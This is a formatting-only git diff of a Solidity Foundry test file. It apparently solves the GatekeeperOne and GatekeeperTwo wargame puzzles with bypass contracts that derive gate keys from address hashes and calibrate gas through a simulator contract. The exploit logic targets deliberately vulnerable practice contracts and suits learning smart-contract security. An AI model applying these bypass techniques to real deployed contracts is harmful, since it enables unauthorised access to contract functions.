@@ -1,6 +1,7 @@
 // SPDX-License-Identifier: MIT
 
 pragma solidity 0.8.21;
+
 import "forge-std/Test.sol";
 import "forge-std/console.sol";
 
@@ -8,6 +9,7 @@ contract TestBypasser is Test {
     GatekeeperOne keeper;
     GateKeeperByPass pass;
     GateSimulator simulator;
+
     function setUp() public {
         keeper = new GatekeeperOne();
         simulator = new GateSimulator();
@@ -27,13 +29,12 @@ contract TestBypasser is Test {
 
 contract GatekeeperTwoBypass {
     constructor(GatekeeperTwo keeperTwo) {
-        uint64 value = uint64(
-            bytes8(keccak256(abi.encodePacked(address(this))))
-        );
+        uint64 value = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
         uint64 _gateKey = uint64(~bytes8(value));
         keeperTwo.enter(bytes8(_gateKey));
     }
 }
+
 contract GatekeeperTwo {
     address public entrant;
 
@@ -52,17 +53,11 @@ contract GatekeeperTwo {
     }
 
     modifier gateThree(bytes8 _gateKey) {
-        require(
-            uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^
-                uint64(_gateKey) ==
-                type(uint64).max
-        );
+        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
         _;
     }
 
-    function enter(
-        bytes8 _gateKey
-    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
+    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
         entrant = tx.origin;
         return true;
     }
@@ -71,6 +66,7 @@ contract GatekeeperTwo {
 contract GateKeeperByPass {
     GatekeeperOne private pass;
     GateSimulator simulator;
+
     constructor(GatekeeperOne _pass, GateSimulator _simulator) {
         pass = _pass;
         simulator = _simulator;
@@ -82,9 +78,8 @@ contract GateKeeperByPass {
         bytes8 key = mask | last;
         // uint256 snap = gasleft();
         // simulator.enter{gas: 8191}(key);
-        (bool success, bytes memory data) = address(simulator).call{gas: 8191}(
-            abi.encodeWithSignature("enter(bytes8)", key)
-        );
+        (bool success, bytes memory data) =
+            address(simulator).call{ gas: 8191 }(abi.encodeWithSignature("enter(bytes8)", key));
         // console.log("Two: ", abi.decode(data, (uint256)));
         uint256 sim = 8191 - abi.decode(data, (uint256));
         // snap = gasleft();
@@ -94,12 +89,14 @@ contract GateKeeperByPass {
         // console.log("SG1: ", snap - gasleft());
         console.log("SG2: ", sim);
         require(success);
-        pass.enter{gas: 8191 + /* 514 */ sim + 3}(key);
+        pass.enter{ gas: 8191 /* 514 */ + sim + 3 }(key);
         console.log("entrat: ", pass.entrant());
     }
 }
+
 contract GateSimulator {
     address public entrant;
+
     modifier gateOne() {
         require(msg.sender != tx.origin);
         _;
@@ -109,9 +106,7 @@ contract GateSimulator {
         _;
     }
 
-    function enter(
-        bytes8 /* _gateKey */
-    ) public view gateOne gateTwo returns (uint256) {
+    function enter(bytes8 /* _gateKey */ ) public view gateOne gateTwo returns (uint256) {
         return gasleft();
     }
 }
@@ -133,24 +128,13 @@ contract GatekeeperOne {
     }
 
     modifier gateThree(bytes8 _gateKey) {
-        require(
-            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
-            "GatekeeperOne: invalid gateThree part one"
-        );
-        require(
-            uint32(uint64(_gateKey)) != uint64(_gateKey),
-            "GatekeeperOne: invalid gateThree part two"
-        );
-        require(
-            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
-            "GatekeeperOne: invalid gateThree part three"
-        );
+        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
+        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
+        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
         _;
     }
 
-    function enter(
-        bytes8 _gateKey
-    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
+    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
         entrant = tx.origin;
         return true;
     }
